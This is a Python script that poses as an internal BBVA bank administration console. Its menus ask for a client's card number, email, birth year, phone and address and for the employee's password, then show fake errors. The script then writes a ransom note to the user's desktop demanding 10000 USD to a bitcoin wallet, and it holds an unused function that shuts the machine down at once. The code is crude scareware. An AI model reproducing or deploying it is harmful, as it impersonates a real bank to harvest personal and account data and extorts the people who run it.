from getpass import getuser
import time
import platform
import subprocess


def check_platform():
    if platform.system() == 'Windows':
        return 'Windows'
    elif platform.system() == 'Linux':
        return 'Linux'
    elif platform.system() == 'Darwin':
        return 'Mac'
    else:
        return 'Unknown'


def get_user():
    return getuser()


def menu():
    while True:
        print(
            "----------------------------------------------------Administracion BBVA----------------------------------------------------")
        print("Try to connect to the vpn...........................")
        time.sleep(1)
        print("VPN CONNECTED")
        print("Access to BBVA Control Point......................")
        time.sleep(1)
        print("Access granted")
        print("Bienvenido de vuelta Dave!/n Por favor selecciona una opcion:")
        print("1. Revisa tus tareas del dia ")
        print("2. Administracion de cuenta propia")
        print("3.-Administracion de cuentas de clientes")
        print("4.-Herrameintas administrativas")
        print("5.-Exit")
        option = int(input("Choose an option: "))
        if option != 1 and option != 2 and option != 3 and option != 4 and option != 5:
            print("Invalid option")
        else:
            return option


def create_file(user_platform):
    USER_PATH_WINDOWS = 'C:\\Users\\' + get_user() + '\\Desktop\\' + get_user() + '.txt'
    USER_PATH_LINUX = '/home/' + get_user() + '/Escritorio/' + get_user() + '.txt'
    user_desktop = None
    if user_platform == 'Windows':
        user_desktop = USER_PATH_WINDOWS
    elif user_platform == 'Linux':
        user_desktop = USER_PATH_LINUX
    with open(user_desktop, 'w') as file:
        file.write('Hello, ' + get_user() + '!\n')
        file.write('Your computer is in danger\n')
        file.write('Please contact your administrator immediately!\n')
        file.write('To rescue your computer please deposit 10000usd to my bitcoin wallet\n')
        file.write('BItcoin wallet: 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 \n')
        file.write('Thank you for use my script :)!')
        file.close()


def options(user_option):
    if user_option == 1:
        print("Requesiting tasks on database............")
        time.sleep(1)
        print("Tasks error")
        print("Hubo un error al solicitar las tareas del dia")
        print("Por favor intenta de nuevo mas tarde o contacta a tu administrador")
        print("Presiona cualquier tecla para continuar")
        input()
        main()
    elif user_option == 2:
        account_id = int(input("Ingresa el numero de cuenta: "))
        print("Revisando cuenta............")
        time.sleep(1)
        print("Cuenta No encontrada en nuestro sistema de empleados"
              "\nPor favor ingresa un numero de cuenta registrado como empleado")
        print("Presiona cualquier tecla para continuar")
        input()
        main()
    elif user_option == 3:
        account = int(input("Ingresa el numero del plastico registrado en la cuenta del  cliente a administrar: "))
        print("Revisando cuenta............")
        time.sleep(1)
        print("Se requiere validadcion extra para poder administrar la cuenta del cliente")
        email = input("Ingresa el correo electronico registrado en la cuenta del cliente: ")
        birth_date = int(input("Ingresa el anio de nacimiento registrado en la cuenta del cliente: "))
        phone = int(input("Ingresa el numero de telefono registrado en la cuenta del cliente: "))
        address = input("Ingresa la direccion registrada en la cuenta del cliente: ")
        print("Revisando cuenta............")
        time.sleep(2)
        print("Selecciona la opcion adecuada")
        print("1. Agregar fondos por operacion no reconocida")
        print("2. Ofrecer fondos de regalo por operacion no renocida")
        print("3. Cancelar operacion no reconocida")
        print("4. Cancelar operacion no reconocida y ofrecer fondos de regalo")
        print("5. Colocar amonestacion por falso registro de operacion")
        print("6 - Cancelar amonestacion por falso registro de operacion")
        print("7.- ELiminar cuenta   SE REQUIERE FIRMA DE SUPERVISOR")
        print("8.- Aprovar solicitud de credito")
        print("9.- Rechazar solicitud de credito")
        print("10.- Aumento en linea de credito")
        option = int(input("Choose an option: "))
        password = input("Ingresa tu contraseña: ")
        print("Validando datos............")
        time.sleep(1)
        print("Error al conectarse a la base de datos, por favor intenta mas tarde")
        print("Presiona cualquier tecla para continuar")
        input()
        main()

    elif user_option == 4:
        print("Herrameintas administrativas............")
        password = input("Ingresa tu contraseña: ")
        print("Contraseña incorrecta")
        print("Presiona cualquier tecla para continuar")
        input()
    elif user_option == 5:
        print("Exit")
        return

    else:
        print("Invalid option")
        exit()


def shutdown(platform_user):
    if platform_user == 'Windows':
        subprocess.call('shutdown -s -t 0', shell=True)
    elif platform_user == 'Linux':
        subprocess.call('shutdown -h now', shell=True)
        print("Shutdown")
    elif platform_user == 'Mac':
        print('Mac platform')
    else:
        print('Unknown platform')


def ultimateSuperDangerVirus():
    # Your computer die in here
    pass


def main():
    ultimateSuperDangerVirus()
    options(menu())
    create_file(check_platform())


if __name__ == "__main__":
    main()
